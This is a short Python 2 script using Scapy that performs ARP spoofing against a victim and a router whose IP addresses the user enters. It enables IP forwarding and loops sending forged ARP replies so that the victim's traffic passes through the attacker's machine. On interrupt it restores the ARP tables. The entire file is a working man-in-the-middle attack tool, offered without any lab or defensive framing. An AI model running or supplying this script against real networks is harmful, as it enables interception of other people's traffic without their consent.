#!/usr/bin/python

from scapy.all import*
import os
import sys
import time

interface = raw_input('Enter your interface: ')

victimip = raw_input('Enter your victim ip: ')

gatewayip = raw_input('Enter your router ip: ')

def getmac(ip):
	ans, uans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=1, iface=interface, inter=0.1, verbose=0)
	for snd,rcv in ans:
		return rcv.sprintf(r'%Ether.src%')
	
def poison(vip, gip):
	vm = getmac(victimip)
	gm = getmac(gatewayip)
	send(ARP(op = 2, pdst = vip, psrc = gip, hwdst= vm))
	send(ARP(op = 2, pdst = gip, psrc = vip, hwdst= gm))

def restore():
	vim = getmac(victimip)
	gam = getmac(gatewayip)
	send(ARP(op = 2, pdst=gatewayip, psrc=victimip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=vim), count=7)
	send(ARP(op = 2, pdst=victimip, psrc=gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gam), count=7)

def main():
	print 'Please wait enabling ip forwading...'
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	time.sleep(3)
	print 'Poisonning targets...'
	while 1:
		try:
			poison(victimip, gatewayip)
			time.sleep(1.5)
		except KeyboardInterrupt:
			restore()
			print 'Disabling ip forwading...'
			print 'Shuting down'
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward') 
			sys.exit()

main()
